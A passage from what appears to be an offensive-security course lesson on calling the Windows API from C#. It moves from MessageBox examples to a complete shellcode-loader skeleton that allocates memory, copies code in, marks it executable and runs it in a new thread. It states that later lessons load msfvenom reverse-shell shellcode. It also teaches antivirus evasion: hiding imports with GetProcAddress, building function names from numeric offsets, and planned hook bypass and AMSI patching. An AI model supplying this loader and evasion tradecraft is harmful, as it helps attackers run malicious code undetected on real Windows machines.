# Document 03: Windows API - How Your Program Talks to Windows

## Where We Are

You finished Document 02 and can write C# programs that store data in variables, make decisions with if/else, loop through arrays, create byte arrays, write functions, XOR-encrypt data, read files, parse command-line arguments, use Marshal.Copy, and build strings from integer offsets.

Your lab is running with Windows 11 (Defender on, default settings), Kali Linux, and both machines on 192.168.10.0/24.

## Why This Is Next

Every program you have written so far does only two things: it processes data (math, XOR, loops) and it prints text to the screen. That is all C# can do on its own. C# cannot create a window. C# cannot allocate a block of memory and mark it as executable. C# cannot open another running program and write data into it. C# cannot start a new thread of execution.

All of these things are controlled by Windows. Your C# program has to ask Windows to do them. The way a program asks Windows to do something is by calling a Windows API function.

The shellcode loaders in Documents 05 through 10 all need Windows to do specific things: give the program a block of executable memory, copy bytes into that memory, and start running those bytes as code. Without the Windows API, none of this is possible. This document teaches you what the Windows API is, how it works, and how to call it from C#.

## How This Works

### What Windows Does When You Use Your Computer

When you double-click a .exe file on your desktop, Windows creates a new process, loads the program into memory, and starts running it. When the program wants to show a window on screen, it cannot just draw pixels on the monitor by itself. It has to ask Windows to create the window. Windows is the one that draws the title bar, the close button, the minimize button, and the border. The program only tells Windows what text to put in the title bar and how big the window should be.

When you right-click on your desktop and a menu appears with options like "New", "Display settings", "Personalize", that menu is created by Windows. The desktop program asked Windows to show a menu with those options, and Windows drew it, positioned it next to your mouse cursor, and handled your click on one of the options.

When you press Ctrl+Alt+Delete and see the lock screen with options like "Lock", "Switch user", "Sign out", "Task Manager", those buttons and that screen are all created by Windows functions. Every button, every text field, every scroll bar, every dialog box you have ever seen on Windows exists because some program called a Windows function to create it.

This is not limited to visual elements. When a program reads a file from your hard drive, it calls a Windows function. When a program connects to the internet, it calls a Windows function. When a program checks how much RAM is available, it calls a Windows function. When a program starts another program, it calls a Windows function.

Windows controls everything on the computer. Programs run on top of Windows and ask it to do things by calling functions. The collection of all these functions that Windows provides is called the Windows API.

### What an API Is

You already know what web APIs are. When you send an HTTP GET request to `https://api.github.com/users/octocat`, GitHub's server processes your request and sends back JSON data about that user. You did not write the code that looks up the user. You did not query GitHub's database. You called their API, and their server did the work.

The Windows API works the same way, except instead of sending HTTP requests over the internet, your program calls functions directly on the same computer. Instead of sending a URL and getting JSON back, your program passes parameters to a function and gets a return value back.

Here is a direct comparison:

**Web API:** You call `POST /api/send-notification` with `{"title": "Alert", "message": "Done"}`. The server creates the notification.

**Windows API:** You call the function `MessageBox` with parameters `"Alert"` and `"Done"`. Windows creates a dialog box on screen with that title and message, with an OK button, and waits for the user to click it.

In both cases, you are asking a system to do work for you. With web APIs, the system is a remote server. With the Windows API, the system is the Windows operating system running on the same machine.

### Where Windows API Functions Live: DLL Files

Windows has thousands of API functions. They are organized into files called DLLs. DLL stands for Dynamic Link Library. A DLL is a file on your hard drive that contains compiled code, specifically a collection of functions that programs can call.

Open File Explorer on your Windows VM and go to `C:\Windows\System32\`. You will see hundreds of .dll files. Each file contains a group of related functions. Here are the ones that matter for this curriculum:

**kernel32.dll** contains functions for the core operations every program needs. Functions for managing memory (allocating it, freeing it, changing its permissions), managing processes (starting them, opening them, reading their information), managing threads (creating new threads of execution), and working with files (reading, writing, deleting). This is the most important DLL for the loaders because it contains the memory and thread functions that execute shellcode.

**user32.dll** contains functions for everything you see on screen. Creating windows, showing dialog boxes, handling mouse clicks, drawing menus, managing the clipboard. This DLL is not important for the loaders, but it is useful for learning because the functions produce visible results you can see immediately.

**ntdll.dll** contains the lowest-level functions in Windows before the actual kernel. Every function in kernel32.dll internally calls a corresponding function in ntdll.dll. For example, when a program calls `VirtualAlloc` from kernel32.dll to allocate memory, kernel32 internally calls `NtAllocateVirtualMemory` from ntdll.dll. ntdll.dll then makes the actual system call to the Windows kernel. This matters for evasion because Defender places monitoring code inside kernel32.dll functions. Document 07 teaches you to skip kernel32.dll and call ntdll.dll directly, so Defender's monitoring code never runs.

**amsi.dll** contains the Antimalware Scan Interface functions. When PowerShell wants to check if a script is malicious before running it, it calls a function in amsi.dll. amsi.dll sends the script to Defender for scanning. If Defender says the script is malware, amsi.dll tells PowerShell to block it. Document 08 teaches you to modify the functions in amsi.dll so they stop sending scripts to Defender.

### How C# Calls a Windows API Function: DllImport

C# is a managed language. It runs inside the .NET runtime, which handles memory management, type safety, and garbage collection. Windows API functions are unmanaged code written in C and C++. They do not run inside the .NET runtime. They run directly on the operating system.

To call an unmanaged Windows function from managed C# code, you use something called P/Invoke. P/Invoke stands for Platform Invoke. It is a feature built into C# that lets you declare a Windows function in your C# code and then call it as if it were a normal C# function.

The way you declare a Windows function is with `[DllImport]`. You tell C# three things: which DLL file the function is in, what the function is called, and what parameters it takes. C# handles the rest. It finds the DLL, locates the function inside it, converts your C# data types to the types the function expects, calls the function, and converts the result back to a C# type.

## What Defender Does

Defender monitors how programs interact with the Windows API at multiple levels:

**Scanning the import table.** When you compile a C# program that uses DllImport, the compiled file contains a list of every DLL and function your program imports. This list is called the import table. Defender reads this table before the program even runs. If the import table shows a program importing VirtualAlloc, CreateThread, and WriteProcessMemory together, Defender knows this combination is commonly used for code injection. Defender can flag the file as suspicious based on the import table alone.

**Hooking API functions.** When your program runs and calls a function like VirtualAlloc, Defender has already modified the beginning of VirtualAlloc inside kernel32.dll. Defender inserted a small piece of code (called a hook) that redirects the call to Defender's own monitoring code first. Defender checks what you are requesting (how much memory, what permissions), decides if it looks suspicious, logs the activity, and then lets the real VirtualAlloc run. This monitoring happens every time any program calls VirtualAlloc. Document 07 teaches you to bypass these hooks by calling ntdll.dll directly instead of going through kernel32.dll.

**Watching for suspicious sequences.** Individual API calls are not always suspicious. A program calling VirtualAlloc is normal. But a program that calls VirtualAlloc, then copies data into that memory, then changes the memory permissions to executable, then creates a new thread at that address matches the exact pattern of a shellcode loader. Defender's behavioral analysis watches for these sequences.

## The Evasion Technique

This document teaches the standard way to call Windows functions. You need to understand the standard way before the evasive ways in later documents make sense. The evasive variations you will learn later are:

- Document 06: Encrypt the shellcode with XOR so Defender does not recognize the bytes
- Document 07: Call ntdll.dll directly instead of kernel32.dll to bypass Defender's hooks
- Document 08: Modify amsi.dll functions so they stop scanning scripts
- Document 10: Use all evasion techniques together

All of these build on the standard API calling pattern you learn here.

## Getting the Loader Onto the Target

No loader in this document. All programs are learning exercises that run on your Windows VM.

## Teaching the Code

### Part 1: Your First Windows API Call - MessageBox

The simplest Windows API function to call is MessageBox. It creates a dialog box on your screen with a message and buttons. It is not useful for evasion, but it is the perfect first example because you can see the result immediately on your screen.

```csharp
using System;
using System.Runtime.InteropServices;
```

The first line you already know from Document 02. The second line brings in the tools needed for P/Invoke. `System.Runtime.InteropServices` contains the `[DllImport]` attribute and the `Marshal` class. You need this line in every program that calls Windows functions.

```csharp
class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
```

This is the P/Invoke declaration. Here is what each part means:

`[DllImport("user32.dll", CharSet = CharSet.Unicode)]` tells C# that the next function exists in user32.dll. `CharSet = CharSet.Unicode` tells C# to convert text strings to Unicode format when passing them to Windows, because Windows uses Unicode for text internally.

`static extern` tells C# that you are not writing this function yourself. The function already exists in user32.dll. You are just telling C# what it looks like so C# knows how to call it.

`int MessageBox(...)` says the function is called MessageBox and it returns an integer. The return value tells you which button the user clicked.

The four parameters:

`IntPtr hWnd` is the handle of the parent window. If you pass `IntPtr.Zero` (which means null, no parent), the dialog box appears on its own, not attached to any window.

`string text` is the message that appears inside the dialog box.

`string caption` is the text in the title bar of the dialog box.

`uint type` controls which buttons appear. `0` shows only an OK button. `1` shows OK and Cancel buttons. `4` shows Yes and No buttons.

Now call it:

```csharp
    static void Main(string[] args)
    {
        int clicked = MessageBox(
            IntPtr.Zero,
            "This dialog box was created by calling a Windows API function from C#.",
            "Windows API Test",
            1);
```

This calls the MessageBox function in user32.dll. Windows receives the call, creates a dialog box with your message, your title, and OK/Cancel buttons, and shows it on screen. The program pauses here and waits for you to click a button. When you click, Windows returns a number telling you which button was clicked.

```csharp
        if (clicked == 1)
            Console.WriteLine("[+] You clicked OK.");
        else if (clicked == 2)
            Console.WriteLine("[+] You clicked Cancel.");
    }
}
```

MessageBox returns 1 if the user clicked OK, and 2 if the user clicked Cancel.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    static void Main(string[] args)
    {
        int clicked = MessageBox(
            IntPtr.Zero,
            "This dialog box was created by calling a Windows API function from C#.",
            "Windows API Test",
            1);

        if (clicked == 1)
            Console.WriteLine("[+] You clicked OK.");
        else if (clicked == 2)
            Console.WriteLine("[+] You clicked Cancel.");
    }
}
```

Run it with `dotnet run`. A dialog box appears on your Windows VM. It has a title bar that says "Windows API Test", your message text in the body, and OK and Cancel buttons. Click one. The terminal prints which button you clicked.

You just called a Windows API function from C#. Your C# code did not draw the dialog box. Your C# code did not create the buttons. Your C# code did not handle the mouse click. Windows did all of that. Your code only said "show a dialog with this text and these buttons" and Windows handled everything else.

### Part 2: Beep - An Even Simpler Windows API Call

MessageBox has multiple parameters and a return value. Here is an even simpler Windows function to reinforce how DllImport works:

```csharp
    [DllImport("kernel32.dll")]
    static extern bool Beep(uint frequency, uint duration);
```

This function lives in kernel32.dll (not user32.dll). It makes a beep sound through the computer's speaker. `frequency` is the pitch in Hertz (440 is the musical note A). `duration` is how long to beep in milliseconds. It returns `true` if the beep played and `false` if it failed.

```csharp
    static void Main(string[] args)
    {
        Console.WriteLine("[*] Playing a beep...");
        Beep(440, 500);
        Console.WriteLine("[+] Done.");
    }
```

This tells Windows: "play a 440 Hz tone for 500 milliseconds." Windows generates the sound. Your code did not create audio data, did not interact with the sound card, did not do any audio processing. It called one function and Windows did everything.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern bool Beep(uint frequency, uint duration);

    static void Main(string[] args)
    {
        Console.WriteLine("[*] Playing three beeps...");
        Beep(440, 300);
        Beep(554, 300);
        Beep(659, 300);
        Console.WriteLine("[+] Done.");
    }
}
```

Run it. You hear three tones (A, C#, E, which makes a major chord). Three function calls, three beeps. Each call tells Windows "play this frequency for this duration" and Windows does it.

The pattern is always the same: declare the function with DllImport, specify the DLL, describe the parameters, and call it. Whether the function creates a dialog box, plays a sound, allocates memory, or opens a process, the pattern does not change.

### Part 3: GetCurrentProcessId - Getting Information from Windows

The previous two examples told Windows to do something (show a dialog, play a sound). Windows API functions can also give you information. GetCurrentProcessId tells you the process ID (PID) of your running program.

Every running program on Windows has a unique number called a process ID. Open Task Manager on your Windows VM (press Ctrl+Shift+Esc). You see a list of all running programs. If you right-click on the column headers at the top and enable "PID", you see the process ID for each one. Windows assigns these numbers when programs start, and uses them internally to keep track of which program is which.

```csharp
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();
```

This function lives in kernel32.dll. It takes no parameters (the empty parentheses mean nothing goes in). It returns a `uint`, which is the process ID of the program that called the function.

```csharp
    static void Main(string[] args)
    {
        uint myPid = GetCurrentProcessId();
        Console.WriteLine("[+] This program's process ID is: " + myPid);
        Console.WriteLine("[*] Open Task Manager and find this number to verify.");
        Console.WriteLine("[*] Press Enter to exit...");
        Console.ReadLine();
    }
}
```

`Console.ReadLine()` waits for you to press Enter. This keeps the program running so you have time to open Task Manager and find the PID.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();

    static void Main(string[] args)
    {
        uint myPid = GetCurrentProcessId();
        Console.WriteLine("[+] This program's process ID is: " + myPid);
        Console.WriteLine("[*] Open Task Manager and find this number to verify.");
        Console.WriteLine("[*] Press Enter to exit...");
        Console.ReadLine();
    }
}
```

Run it. It prints a number. Open Task Manager, look for "dotnet" in the process list, and confirm the PID matches. You asked Windows a question ("what is my process ID?") and Windows gave you the answer.

### Part 4: Handles - How Windows Tracks Resources

Before going further, you need to understand handles. Almost every Windows API function that gives you access to something (a file, a process, a thread, a block of memory) returns a handle.

When you open a file in Notepad, Windows does not hand Notepad the physical sectors on your hard drive. Windows gives Notepad a handle, which is a number. That number is Windows' internal reference for "the file that Notepad opened." When Notepad wants to read data from the file, it passes the handle back to Windows and says "read from this handle." Windows looks up the handle, finds the file it refers to, reads the data, and sends it to Notepad.

When you open Task Manager, Task Manager calls OpenProcess to get information about running processes. Windows does not give Task Manager direct access to those processes. Windows gives Task Manager handles to them. Task Manager passes those handles to other functions to get process names, memory usage, and CPU usage.

In C#, handles are stored as `IntPtr` values. When a Windows function returns `IntPtr.Zero` (the number 0), it means the function failed. A valid handle is always a non-zero number.

The pattern you will see in every loader:

```csharp
        IntPtr handle = SomeWindowsFunction();
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] Function failed.");
            return;
        }
        Console.WriteLine("[+] Got handle: 0x" + handle.ToString("X"));
```

Call the function, check if it returned zero, stop if it failed, continue if it succeeded.

When you are done with a handle, you tell Windows to close it:

```csharp
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
```

```csharp
        CloseHandle(handle);
```

This tells Windows "I am done with this resource, you can clean it up." If you do not close handles, they stay open and waste system resources. In the loaders, the program usually exits after running shellcode, and Windows cleans up all handles when a process exits. But for anything that runs longer, you should close handles when you are done with them.

### Part 5: VirtualAlloc - Getting a Block of Memory from Windows

Now we get to the functions that matter for shellcode execution. The first one is VirtualAlloc, which asks Windows to give your program a block of memory.

In Document 02, you created byte arrays with `new byte[256]`. C# allocated memory for that array and managed it for you. But C# controls that memory completely. C# decides where the array goes in memory. C# can move it around during garbage collection. And most importantly, C# marks all array memory as data-only. The CPU is not allowed to execute code from a C# byte array. This is a security feature called DEP (Data Execution Prevention). DEP prevents attackers from putting code into data areas and running it.

Shellcode is code. It needs to run. So you cannot put shellcode in a C# byte array and tell the CPU to execute it. The CPU will refuse.

VirtualAlloc asks Windows to give you a block of memory with specific permissions that you choose. If you ask for memory with execute permission, the CPU is allowed to run code from it.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
```

`SetLastError = true` tells C# to save the Windows error code if VirtualAlloc fails, so you can find out why.

The four parameters:

`IntPtr lpAddress` is the memory address where you want the block. Pass `IntPtr.Zero` to let Windows pick the address. You almost always let Windows choose because it knows which addresses are available.

`uint dwSize` is how many bytes of memory you want. If your shellcode is 510 bytes, you request 510 bytes.

`uint flAllocationType` controls the type of allocation. The value `0x3000` means "reserve the address range and make the memory pages ready to use." This is the value you use in every loader. It is a combination of MEM_COMMIT (0x1000, which prepares the memory pages for use) and MEM_RESERVE (0x2000, which reserves the address range so nothing else uses it). You combine them: 0x1000 + 0x2000 = 0x3000.

`uint flProtect` sets the permissions for the memory. This is the most important parameter for shellcode execution:

- `0x04` is PAGE_READWRITE. You can read data from this memory and write data to it. You cannot execute code from it. This is like normal data storage.
- `0x20` is PAGE_EXECUTE_READ. The CPU can execute code from this memory and you can read data from it. You cannot write to it.
- `0x40` is PAGE_EXECUTE_READWRITE. You can read, write, and execute. All permissions at once.

Using `0x40` is the simplest approach because you can write your shellcode in and execute it without any extra steps. But memory that is both writable and executable at the same time is very unusual for legitimate programs. Defender flags it. The safer approach is:

1. Allocate memory with `0x04` (read-write only, so you can write data into it)
2. Copy your shellcode bytes into that memory
3. Change the permissions to `0x20` (execute-read only, so the CPU can run the code)

This two-step approach is less suspicious because the memory is never writable and executable at the same time. While you are writing to it, it is not executable. After it becomes executable, it is no longer writable.

Let's call VirtualAlloc:

```csharp
        uint memSize = 4096;
        IntPtr mem = VirtualAlloc(IntPtr.Zero, memSize, 0x3000, 0x04);
```

This asks Windows: "Give me 4096 bytes of memory. I need to be able to read and write to it. Put it wherever you want." Windows picks an address, reserves 4096 bytes at that address, and returns the address.

```csharp
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed. Windows did not give us memory.");
            return;
        }
        Console.WriteLine("[+] Windows gave us memory at address: 0x" + mem.ToString("X"));
```

If VirtualAlloc returns zero, the allocation failed (usually means invalid parameters or out of memory). Otherwise, `mem` is a valid memory address where you have 4096 bytes of read-write memory.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        Console.WriteLine("[*] Asking Windows for 4096 bytes of read-write memory...");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x04);

        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }

        Console.WriteLine("[+] Got memory at address: 0x" + mem.ToString("X"));
        Console.WriteLine("[*] This memory is read-write. We can store data in it.");
        Console.WriteLine("[*] The CPU cannot execute code from it yet (no execute permission).");

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory given back to Windows.");
    }
}
```

`VirtualFree` gives the memory back to Windows. `0x8000` is MEM_RELEASE, which releases the entire block. In a real loader, you do not free the memory because your shellcode needs to stay in it and keep running.

### Part 6: Copying Data Into Allocated Memory

After VirtualAlloc gives you a memory address, the memory is empty (all zeros). You need to copy your shellcode bytes into it. You already learned `Marshal.Copy` in Document 02. Here is how it works with VirtualAlloc:

```csharp
        byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };
```

These are four harmless machine instructions: 0xCC is INT3 (a debugger breakpoint), 0x90 is NOP (do nothing), and 0xC3 is RET (return). We are using these for testing, not real shellcode.

```csharp
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x04);
```

Allocate memory the same size as the data array. `(uint)data.Length` converts the array length from int to uint because VirtualAlloc expects a uint.

```csharp
        Marshal.Copy(data, 0, mem, data.Length);
```

Copy the bytes from the C# array into the allocated memory. Parameters: source array, starting position in the array (0 means start from the first byte), destination memory address, number of bytes to copy.

After this line, the memory at address `mem` contains the bytes 0xCC, 0x90, 0x90, 0xC3. The C# array `data` also still contains those bytes. You now have the data in two places.

```csharp
        Array.Clear(data, 0, data.Length);
```

Clear the original C# array. Set every byte to zero. Now the data exists only in the VirtualAlloc memory. If Defender scans the managed memory of your .NET process, it will not find the shellcode there because you zeroed it out. The shellcode lives only in the unmanaged VirtualAlloc memory.

```csharp
        byte check = Marshal.ReadByte(mem);
        Console.WriteLine("[*] First byte at memory address: 0x" + check.ToString("X2"));
```

`Marshal.ReadByte` reads one byte from a memory address. This verifies that the copy worked. It should read 0xCC, which is the first byte we copied in.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };
        Console.WriteLine("[*] Created " + data.Length + " bytes of test data.");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory allocated at: 0x" + mem.ToString("X"));

        Marshal.Copy(data, 0, mem, data.Length);
        Console.WriteLine("[+] Copied " + data.Length + " bytes into allocated memory.");

        Array.Clear(data, 0, data.Length);
        Console.WriteLine("[+] Cleared the original C# array.");

        byte check = Marshal.ReadByte(mem);
        Console.WriteLine("[*] First byte in allocated memory: 0x" + check.ToString("X2"));
        Console.WriteLine("[*] First byte in C# array: " + data[0] + " (zero, because we cleared it)");

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Done.");
    }
}
```

Output:
```
[*] Created 4 bytes of test data.
[+] Memory allocated at: 0x<some address>
[+] Copied 4 bytes into allocated memory.
[+] Cleared the original C# array.
[*] First byte in allocated memory: 0xCC
[*] First byte in C# array: 0 (zero, because we cleared it)
[+] Done.
```

### Part 7: VirtualProtect - Changing Memory Permissions

The memory from VirtualAlloc has read-write permissions (0x04). The data is in there. But the CPU still cannot execute it because the memory does not have execute permission. VirtualProtect changes the permissions of memory that already exists.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
```

`IntPtr lpAddress` is the address of the memory block (from VirtualAlloc).

`uint dwSize` is the size of the block in bytes.

`uint flNewProtect` is the new permission value. Use `0x20` (PAGE_EXECUTE_READ) to make it executable and readable.

`out uint lpflOldProtect` is where Windows stores the old permission value. The `out` keyword means Windows writes a value into this variable. You need to declare the variable before calling the function, but you do not usually need the old value for anything.

```csharp
        uint oldPermissions;
        bool changed = VirtualProtect(mem, (uint)data.Length, 0x20, out oldPermissions);

        if (!changed)
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Memory permissions changed to execute-read.");
```

After this call, the memory at address `mem` is executable. The CPU can run the bytes stored there as machine instructions. You can no longer write to that memory because execute-read does not include write permission. But that is fine because you already copied the data in during the read-write phase.

### Part 8: CreateThread - Running Code in Memory

The data is in executable memory. The final step is telling the CPU to start running the bytes at that address. You do this by creating a new thread.

When your program starts, it runs on what is called the main thread. The main thread is the one that executes your Main function. A thread is a single sequence of instructions that the CPU follows. Your program can create additional threads, and each one runs independently at the same time.

CreateThread creates a new thread that starts running at a specific memory address. If that address contains your shellcode, the CPU starts executing your shellcode.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
```

This has six parameters, but only one matters for us:

`IntPtr lpStartAddress` is the memory address where the new thread begins executing. You pass the address from VirtualAlloc.

The rest are set to default values:
- `IntPtr.Zero` for lpThreadAttributes means default security.
- `0` for dwStackSize means default stack size.
- `IntPtr.Zero` for lpParameter means no extra data passed to the thread.
- `0` for dwCreationFlags means the thread starts running immediately.
- `out uint lpThreadId` receives the ID number of the new thread.

```csharp
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);

        if (thread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }
        Console.WriteLine("[+] New thread started with ID: " + tid);
```

After CreateThread, the CPU is running the bytes at address `mem` on a new thread. But the main thread (your Main function) keeps going too. If Main reaches the end and the program exits, the new thread dies with it. For shellcode that keeps running (a reverse shell connection stays open until you close it), you need to prevent Main from exiting.

WaitForSingleObject pauses the main thread until the new thread finishes:

```csharp
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
```

```csharp
        WaitForSingleObject(thread, 0xFFFFFFFF);
```

`0xFFFFFFFF` means wait forever. The main thread stops at this line and does nothing until the new thread finishes executing. For a reverse shell, the new thread runs until the attacker closes the connection.

Here is the complete program that puts VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread, and WaitForSingleObject together. It executes a single byte `0xC3`, which is the machine instruction RET (return from function). This instruction immediately returns, ending the thread:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        byte[] code = new byte[] { 0xC3 };
        Console.WriteLine("[*] Code: 1 byte (RET instruction, returns immediately).");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)code.Length, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory at: 0x" + mem.ToString("X"));

        Marshal.Copy(code, 0, mem, code.Length);
        Console.WriteLine("[+] Code copied to memory.");

        uint oldProtect;
        if (!VirtualProtect(mem, (uint)code.Length, 0x20, out oldProtect))
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Memory is now executable.");

        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);
        if (thread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }
        Console.WriteLine("[+] Thread " + tid + " is running the code.");

        WaitForSingleObject(thread, 0xFFFFFFFF);
        Console.WriteLine("[+] Thread finished.");
    }
}
```

Output:
```
[*] Code: 1 byte (RET instruction, returns immediately).
[+] Memory at: 0x<address>
[+] Code copied to memory.
[+] Memory is now executable.
[+] Thread <id> is running the code.
[+] Thread finished.
```

The CPU started executing at the address. It hit the byte 0xC3 (RET), which means "return." The thread ended immediately. In Document 05, you replace `{ 0xC3 }` with real msfvenom shellcode. The only thing that changes is the bytes. The pattern stays the same: allocate, copy, protect, thread, wait.

### Part 9: GetModuleHandle and GetProcAddress - Finding Functions at Runtime

Every DllImport you write puts the function name and DLL name into the compiled binary's import table. Defender reads the import table. If your binary's import table says it imports VirtualAlloc, VirtualProtect, and CreateThread, Defender knows this program can allocate executable memory and start code in it. That is suspicious.

To avoid this, you can find functions at runtime instead of declaring them with DllImport. Two functions help with this:

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
```

GetModuleHandle takes a DLL name and returns the memory address where that DLL is loaded. Every Windows process automatically loads kernel32.dll when it starts, so GetModuleHandle("kernel32.dll") always works.

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
```

GetProcAddress takes two things: the address of a DLL (from GetModuleHandle) and the name of a function inside that DLL. It returns the memory address of that function.

Together:

```csharp
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        Console.WriteLine("[+] kernel32.dll loaded at: 0x" + k32.ToString("X"));

        IntPtr funcAddr = GetProcAddress(k32, "VirtualAlloc");
        Console.WriteLine("[+] VirtualAlloc is at: 0x" + funcAddr.ToString("X"));
```

Now you have the raw address of VirtualAlloc in memory. But having an address is not enough. C# needs to know what parameters the function takes so it can call it correctly. You provide this information with a delegate.

A delegate defines the shape of a function: what parameters it takes and what it returns. You already learned functions in Document 02. A delegate is like a blueprint for a function:

```csharp
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
```

This says "a VirtualAllocDelegate is any function that takes these four parameters and returns an IntPtr." The attribute `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` tells C# that this function follows the Windows calling convention (StdCall), which is the standard way Windows functions receive their parameters.

Now convert the address into something you can call:

```csharp
        var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            funcAddr, typeof(VirtualAllocDelegate));
```

`Marshal.GetDelegateForFunctionPointer` takes the memory address and the delegate type, and gives you a callable function. Now you call VirtualAlloc through `allocFunc`:

```csharp
        IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
```

This does the same thing as calling VirtualAlloc through DllImport. The difference is that "VirtualAlloc" does not appear in the compiled binary's import table. You only have DllImport for GetModuleHandle and GetProcAddress, which are used by thousands of legitimate programs and are not suspicious.

In the real loaders (Documents 05 through 10), even the string "VirtualAlloc" is hidden. Instead of passing the name directly to GetProcAddress, the loader builds the name from numbers using FromOffsets (from Document 02):

```csharp
        string name = FromOffsets(32, 54,73,82,84,85,65,76,33,76,76,79,67);
        IntPtr funcAddr = GetProcAddress(k32, name);
```

The compiled binary contains the numbers 32, 54, 73, 82, etc. Defender's static scanner sees numbers, not the text "VirtualAlloc." The text is built only when the program runs, in memory, and disappears when the program exits.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    static void Main(string[] args)
    {
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        if (k32 == IntPtr.Zero)
        {
            Console.WriteLine("[-] Could not find kernel32.dll.");
            return;
        }
        Console.WriteLine("[+] kernel32.dll at: 0x" + k32.ToString("X"));

        IntPtr vaAddr = GetProcAddress(k32, "VirtualAlloc");
        if (vaAddr == IntPtr.Zero)
        {
